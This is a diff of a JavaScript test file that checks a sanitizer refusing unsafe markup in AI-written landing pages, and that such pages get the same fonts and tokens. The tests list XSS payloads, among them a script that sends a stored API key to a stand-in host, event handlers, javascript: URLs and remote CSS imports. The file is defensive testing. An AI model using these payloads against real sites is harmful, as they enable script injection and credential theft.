@@ -353,6 +353,101 @@ if (houseFlags.length) throw new Error(`the house trips its own detector on ${ho
   }
 }
 
+// ——— 0f. a page the model wrote whole cannot reach the app or the network ———
+// The arranged page is safe because the app builds it. A written page is markup a model chose, and
+// the frame a paper renders in carries allow-scripts with allow-same-origin, which together are
+// not a sandbox: a script that survived here would run against this app's origin, where the keys
+// are. And a page that fetches anything stops being the one file the whole product promises. So
+// the filter is an allowlist, and this is the list of things it has to refuse.
+{
+  const attacks = [
+    ['a script tag', '<h1>x</h1><script>fetch("//e.co?k="+localStorage.wall_key_anthropic)</script>'],
+    ['a script tag left unclosed by a cut reply', '<h1>x</h1><script>steal()'],
+    ['an event handler', '<h1>x</h1><div onclick="alert(1)">go</div>'],
+    ['an event handler with odd casing', '<h1>x</h1><div OnMouseOver=alert(1)>go</div>'],
+    ['a javascript url', '<h1>x</h1><a href="javascript:alert(1)">go</a>'],
+    ['a remote image', '<h1>x</h1><img src="https://e.co/track.gif" alt="">'],
+    ['a remote stylesheet', '<h1>x</h1><link rel="stylesheet" href="https://e.co/x.css">'],
+    ['a font import in the css', 'body{color:red}'],
+    ['an iframe', '<h1>x</h1><iframe src="https://e.co"></iframe>'],
+    ['an svg carrying a handler', '<h1>x</h1><svg onload="alert(1)"><circle r="9"/></svg>'],
+    ['a form posting somewhere', '<h1>x</h1><form action="https://e.co"><input name="p"></form>'],
+  ]
+  const escaped = []
+  for (const [what, html] of attacks) {
+    const out = core.safeMarkup(html)
+    if (/<script|<iframe|<svg|<link|<form|<input|\son[a-z]+\s*=|javascript:/i.test(out)) escaped.push(what)
+    if (/(?:src|href)\s*=\s*["']?(?:https?:)?\/\//i.test(out)) escaped.push(`${what} (kept a remote url)`)
+  }
+  const css = core.safeStyle('@import url(https://e.co/f.css);a{background:url("https://e.co/p.gif")}b{width:expression(x)}')
+  if (/@import|https?:/i.test(css)) escaped.push('a remote url in the css')
+  // and the one structural claim: a landing page has a headline, so a reply without one is refused
+  // rather than put on the wall as a place nobody can compare
+  const noHeadline = core.madeWritten({ html: '<section><p>words</p></section>', css: '' })
+  const good = core.madeWritten({ html: '<section><h1>A real headline</h1></section>', css: 'h1{font-size:4rem}', note: 'a poster' })
+  console.log('a written page is filtered:', JSON.stringify({
+    attacksRefused: `${attacks.length - escaped.length} of ${attacks.length}`,
+    escaped: escaped.length ? escaped : 'none',
+    aReplyWithNoHeadlineIsRefused: noHeadline === null,
+    aGoodOneSurvives: Boolean(good?.html && good?.note === 'a poster'),
+  }))
+  if (escaped.length) throw new Error(`model authored markup got ${escaped.length} things past the filter: ${escaped.join('; ')}`)
+  if (noHeadline !== null) throw new Error('a written page with no headline was accepted, so the wall has a paper nothing can compare')
+  if (!good?.html) throw new Error('the filter rejected a page that was fine, so nothing would ever reach the wall')
+}
+
+// ——— 0g. a written page wears the same tokens and the same faces as an arranged one ———
+// The comparison on the wall is only honest if both halves get the same materials. An arranged
+// page carries its variable faces inside the file; a written one that did not would be judged on
+// which fonts the machine happened to have rather than on how it was designed.
+{
+  const base = core.starterPage(core.PRESETS[0], 'Spoor')
+  const written = {
+    ...base,
+    written: { html: '<section class="hero"><h1>Every session, searchable</h1></section>', css: '.hero{padding:8rem 2rem}', note: 'a poster' },
+  }
+  const html = core.renderPage(written, { title: 'Spoor' })
+  const arranged = core.renderPage(base, { title: 'Spoor' })
+  console.log('a written page in the same shell:', JSON.stringify({
+    carriesItsFaces: html.includes('@font-face') === arranged.includes('@font-face'),
+    carriesTheTokens: html.includes('--accent:') && html.includes('--line:'),
+    itsOwnMarkupSurvived: html.includes('class="hero"'),
+    noArrangedBlocks: !html.includes('class="page page-'),
+    selfContained: !/(?:src|href)=["']https?:/.test(html),
+    // the detector and the ruler are the only thing standing between this and the wall now
+    theDetectorStillReadsIt: core.slop(written, html).length >= 0,
+  }))
+  if (!html.includes('--accent:')) throw new Error('a written page did not get the taste sheet, so it cannot be restyled or compared')
+  if (arranged.includes('@font-face') && !html.includes('@font-face')) {
+    throw new Error('a written page shipped without the faces the arranged pages carry, so the wall compares availability rather than design')
+  }
+  if (html.includes('class="page page-')) throw new Error('a written page was wrapped in the arranged layout, which is the box it exists to leave')
+
+  // The detector has to read the markup, not the sections underneath it. A written page keeps its
+  // sections for the brief, and those still hold the defaults nobody rewrote, so reading them
+  // judges the page on copy the reader cannot see. The first one rendered end to end reported six
+  // tells, all of them from placeholder sections that never reach the screen.
+  const sloppy = {
+    ...base,
+    written: {
+      html: '<section><h1>Unlock seamless productivity</h1><p>Save time and grow your business.</p></section>',
+      css: '', note: 'x',
+    },
+  }
+  const onWritten = core.slop(written).map((f) => f.label)
+  const onSloppy = core.slop(sloppy).map((f) => f.id)
+  console.log('the detector reads the markup, not the sections beneath it:', JSON.stringify({
+    onAPageThatSaysSomething: onWritten.length ? onWritten : 'clean',
+    onAPageOfHollowWords: onSloppy,
+  }))
+  if (onWritten.length) {
+    throw new Error(`a clean written page was flagged for ${onWritten.join(', ')}, which is the placeholder sections beneath it`)
+  }
+  if (!onSloppy.includes('hollow-word')) {
+    throw new Error('a hollow word in the written markup was not read, so the gate does not cover the half that has no template')
+  }
+}
+
 // ——— 0a. the block library reaches the page, and the geometry holds ———
 // Both gates live in verify/layout.mjs, because they measure rendered pages rather than drive
 // the app, and they are worth running alone while a block is being changed.
